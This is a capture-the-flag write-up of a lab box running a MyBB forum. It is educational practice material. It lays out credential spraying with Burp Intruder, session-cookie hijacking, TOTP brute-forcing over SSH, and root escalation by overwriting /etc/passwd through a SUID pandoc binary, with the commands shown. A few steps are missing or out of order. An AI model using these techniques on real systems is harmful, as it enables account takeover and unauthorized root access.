Matrix: Exit Denied, a forum, a cipher chain, and four flags

A forum that leaks its own staff roster, a credential-spray attack built from a vulnerability report nobody secured, a cipher puzzle three layers deep, a stolen session cookie, a time-synced SSH brute force, and a SUID binary that overwrites its way to root.

Room: Matrix: Exit Denied Category: Web / OSINT / Linux Privesc Tools: Gobuster, Burp Intruder, CyberChef

The setup: a Linux box running a MyBB forum, nothing else handed over. Four separate flags are hidden across the chain, user, root, an admin control panel PIN, and one buried in a web application data file. Several of the actual flag values are redacted in the original notes (the room's own screenshots black them out), so the technique matters here more than any single answer.

This one has a lot of moving parts, organized below in the order they were actually found.

Why this works

A lot of these gobuster hits are decoys, same response size as a generic 200, a reminder that directory brute-forcing surfaces candidates, not answers. /admin redirecting to a real login page is what actually matters here.

2
Harvest usernames without logging in

MyBB's Team page lists every Super Moderator, Administrator, and Moderator without requiring an account: BlackCat (Super Moderator), an Administrator account, and a Moderators list including ArnoldBagger, BlackCat, BlueMan, DotHaxer, and DrBert among others. The Members directory separately surfaces a user named Willis alongside a "White Rabbit" hint on the page.

Registering a forum account and searching posts by Willis turns up a single thread, "Bug Bounty Program," referencing a hidden path:

We are committed to protecting our community from future cyber attacks.
If you're a security expert or enthusiast who actively participates in
finding security holes in web applications, then linux-bay needs you.
To participate all you need to do is ensure you report any minor
weaknesses to the following page: /bugbountyHQ and we will attempt to
resolve said issues. Please note: if the security weakness is considered
critical then please PM me or any of the mods, thank you
Why this works

A public team roster is a free username list, and a forum's own search feature is enough OSINT to find a thread never meant to be the main attraction. The "report it here" page is the real target precisely because it was built to receive untrusted input.

3
Follow the bug bounty page to a leaked vulnerability report

/bugbountyHQ shows a disabled submission form, "under maintenance." Inspecting the form element reveals where it actually posts to:

<form method="post" action="/reportPanel.php">
  <h2>Bug Bounty Report Form</h2>
  <p style="color:red;">(Disabled: under maintenance until further notice)</p>

/reportPanel.php loads directly, no authentication required, and lists every bug report ever submitted, including one critical finding that spells out the forum's exact weakness:

Edwards  Alexandra  Edwards@mail.com  critical  21/02/21

your mybb login system is not using any 'captcha mechanism' or 'failed
login timeout method' which makes it very vulnerable to password spray
attacks. Considering several surveys have found that 3 in 5 online
users use weak passwords such as: password123, Password123, crabfish,
linux123, secret, piggybank, windowsxp, starwars, supermario,
Luisfactor05, james123, etc, i would say you should ASAP implement some
protection to avoid future data breaches
Why this works

An unauthenticated report viewer is already a bug on its own, but the real gift here is a disclosed vulnerability (no login lockout) paired with a ready-made weak-password wordlist, both handed over for free by the application meant to track security issues.

4
Spray it with Burp Intruder

Capturing a login attempt in Burp shows the raw POST:

POST /member.php HTTP/1.1
Host: 10.10.207.150
Content-Type: application/x-www-form-urlencoded

username=admin&password=pass&submit=Login&action=do_login&...

Sent to Intruder with two payload positions marked (username and password), attack type set to Cluster bomb (every username tried against every password): payload set 1 is the Mod/Admin roster from the team page, payload set 2 is the weak-password list from the leaked report. 117 total requests later, two responses stand out by their Length column, distinctly shorter than the uniform "invalid login" response every failed attempt returns:

Request  Payload1       Payload2   Status  Length
102      ArnoldBagger   ...        200     5985
90       PalacerKing    ...        200     5985
0        blackCat       ...        200     10604
100      blackCat       ...        200     10604
Why this works

A successful login renders a completely different page than a failed one, so the response length is a reliable signal even without reading every result individually. Cluster bomb mode is exactly suited for "try every combination of these two independent lists" rather than lockstep pairing.

Part 2: The Keymaker's Puzzle

1
Decode a hidden cipher on the report page

The reportPanel.php page source hides a <p hidden> element, a "Keymaker message" made of two separate encoded strings. The first is a run of numbers all between 1 and 26:

1 16 5 18 13 21 20 1 20 9 15 14 15 6 15 14 12 25 20 8 5 5 14 7 12 9 19 8
12 5 20 20 5 18 19 23 9 12 12 15 16 5 14 20 8 5 12 15 3 11 19

1 4 4 18 5 19 19

That's a straightforward A1Z26 cipher (1=A, 2=B, ...), decoded with an online tool:

Transformed text:
a permutation of only the english letters will open the locks
address

The second part of the message is a binary string, which decodes to ASCII as "Keymaker," followed by a segment of the binary itself blacked out in the source notes, it decodes to a directory name on the server, but that specific value isn't recoverable from what's captured here (it's a genuine redaction in the source, not reproduced).

Why this works

A1Z26 and binary-to-ASCII are both trivial once recognized, the harder skill is just noticing the pattern (numbers capped at 26, strings of only 0s and 1s) and knowing which decoder to reach for.

2
Find six letters hidden inside Chinese characters

The decoded directory hosts an animated Matrix-style webpage. Its page source, under the Console tab, embeds a JavaScript variable holding a long string of Chinese characters with a comment labeling it:

#keymaker: "English letters below"
chinese = "..."
alphabet = "abcdefghijkllmnopqrstuvwxyz"
for i in chinese:
    if i in alphabet:
        print(i, end='')

Running that extraction script against the captured string pulls out exactly six Latin letters hiding among the Chinese text:

$ python3 chinese.py
ofqxvg
6 letters
Why this works

Mixed-script text is an easy place to hide a short signal in a lot of noise, a human skimming the page sees "Chinese characters" and moves on, but a simple membership check against the English alphabet filters it out in one pass.

3
Session-hijack into a higher-privilege account

Logged in as the cracked ArnoldBagger account, a private message to "Soapsvector" references another hidden path, /devBuilds, holding an offline v2 build. Separately, swapping ArnoldBagger's session cookie for BlackCat's value (via the browser's Storage/Cookies inspector) and refreshing the page logs the browser in as BlackCat instead, no password needed:

mybb[lastvisit]=1628560163
mybb[lastactive]=1628559127
mybbuser=7_JY1AvB8cqCMkIFprMxWbTxwf8dSkiv7GJHzLPDWJWWg9gnG3FB

BlackCat's Attachment Manager (a higher-privilege Super Moderator folder) holds several files worth pulling down: testing.zip, hardwareToken.jpg, DevTools.zip, Releases.txt, two SSH-TOTP architecture diagrams, and an SSH-TOTP documentation.pdf.

Why this works

A session cookie is the login, MyBB (like most session-based auth) never re-checks the password after the cookie is issued. Swapping in someone else's valid cookie value is functionally identical to knowing their password, as long as the cookie itself is reachable.

4
Learn what the SSH login is actually protected by

One of the downloaded files, a testing document, reveals the SSH login for user architect is secured with TOTP (time-based one-time passwords), and lists three candidate shared-secret tokens still being validated:

SSH-TOTP Testing document
Shared secret Tokens   Device type    Username    Working?
128939448577488        Arduino NG     architect   inconclusive
592988748673453        Arduino USB    architect   inconclusive
792513759492579        Arduino Uno    architect   inconclusive
Why this works

TOTP only works if the client and server clocks agree closely, and it only works at all if you have the shared secret seed. This leaked testing doc hands over three candidate seeds without needing to break the TOTP algorithm itself.

5
Sync the clock without breaking the system timezone

Changing the whole system timezone to UTC didn't stick, it reverted automatically. Scoping the fix to just the one command that needs it works cleanly instead:

TZ=UTC sudo python3 Matrixbrute.py --full-time
Why this works

TOTP codes are only valid for a narrow time window, so even a few minutes of clock drift breaks every guess. Setting TZ as an environment variable for a single command avoids fighting whatever process (likely a systemd timesync unit) kept reverting the full system change.

Part 3: Root, and the Remaining Flags

1
Find the SUID binary that shouldn't be there
architect@matrixV99:/$ find / -perm -u=s 2>/dev/null

/usr/bin/gpasswd

root@matrixV99:/home/architect# ls -la /usr/bin/pandoc
-rwsr-sr-x 1 root root 80908912 Mar  8 16:55 /usr/bin/pandoc
Why this works

Most of this list is expected, sudo, passwd, and friends are supposed to run as root. pandoc, a document converter, has no business being SUID, which is exactly what makes it worth investigating.

2
Use pandoc's SUID bit to overwrite /etc/passwd
architect@matrixV99:~$ cp /etc/passwd .
architect@matrixV99:~$ ls
helloVisitor.txt  motd.net  passwd  user.txt
architect@matrixV99:~$ openssl passwd Hacked
xngpSLPODPFmw
architect@matrixV99:~$ nano passwd

Inside nano, the first line's password field (the x placeholder) gets replaced with the hash just generated:

root:xngpSLPODPFmw:0:0:root:/root:/bin/bash

Then pandoc, running with its own SUID root privileges, writes that edited copy over the real file:

architect@matrixV99:~$ pandoc passwd -t plain -o /etc/passwd
[WARNING] Could not deduce format from file extension
  Defaulting to markdown
architect@matrixV99:~$ su root
Password: Hacked
root@matrixV99:/home/architect# whoami
root
Why this works

pandoc can read and write arbitrary files as root because of the SUID bit, and it doesn't care that the "document" it's converting happens to be /etc/passwd. Giving root a known password hash is a complete, durable privilege escalation, not just a one-off shell.

3
Run an oddly-named script for the root flag

A file named -- -root.py turns up during enumeration, the leading dashes make it resist normal access, the shell tries to interpret them as flags for whatever command touches it. find locates its real relative path cleanly:

root@matrixV99:/etc# find . -name '--*root.py'
./-- -root.py

Quoting the filename lets Python treat it as a literal path instead of a set of flags:

root@matrixV99:/etc# python3 './-- -root.py'
$ > You've been Hacked!!!!REQ> Source: Matrix v.99; Destination: Real world;
$ > EXIT GRANTED;
$ > Exiting Matrix... Entering real world... Please wait...
LOADING... [####################] 100%

The root flag prints at the bottom (redacted in the source notes, not reproduced here).

Why this works

A filename starting with - is a classic way to make a file awkward to reference directly, since most commands will try to parse it as an option. Quoting the full path, or prefixing with ./, sidesteps the ambiguity entirely.

4
Grep for the admin PIN across likely directories
root@matrixV99:/var# grep -rn "PIN"
install/resources/upgrade30/upgrade30.php:2418: <div class="title">ACP PIN Configuration</div>
install/resources/upgrade30/upgrade30.php:2443: $config['secret_pin']

That points at a config file, found and read directly:

root@matrixV99:/var/www/html# find . -name config.php
./inc/config.php
root@matrixV99:/var/www/html# cat ./inc/config.php

Near the bottom:

$config['secret_pin'] = <redacted in source>;
Why this works

Grepping for a keyword like "PIN" across a scoped directory (/var, since this is web-application data) is much faster than guessing a config file's location outright, and the application code itself names the exact variable to look for.

5
Grep for the web flag inside raw database files
root@matrixV99:/var# grep -rni "flag{"
Binary file lib/mysql/mybb/mybb_datacache.MYD matches
Binary file lib/mysql/mybb/mybb_templates.MYD matches
Binary file lib/mysql/mybb/mybb_themestylesheets.MYD matches
Binary file lib/mlocate/mlocate.db matches

Catting the first hit directly dumps the flag inline among the raw MyISAM table data (redacted in the source, not reproduced):

cat /var/lib/mysql/mybb/mybb_datacache.MYD
Why this works

A flag stored inside application data (not a standalone text file) won't show up in a normal filesystem walk, but it will show up in a content grep across the right directory, here, MySQL's raw table files on disk, bypassing the database layer entirely.

Takeaways

Public forum metadata is reconnaissance

A team roster and a searchable post history, both completely ordinary forum features, delivered usernames and a hidden-page hint with zero exploitation involved.

A vulnerability tracker is itself an attack surface

An unauthenticated bug bounty report viewer handed over both a disclosed weakness (no login lockout) and a ready-made password list in one page.

Session cookies are bearer tokens

Possessing a valid session cookie is equivalent to knowing the password behind it. Anywhere a cookie can be read or copied, it can be replayed.

An unexpected SUID bit is worth investigating every time

pandoc has no inherent reason to run as root. The SUID bit itself, not any flaw in pandoc, was the actual vulnerability.
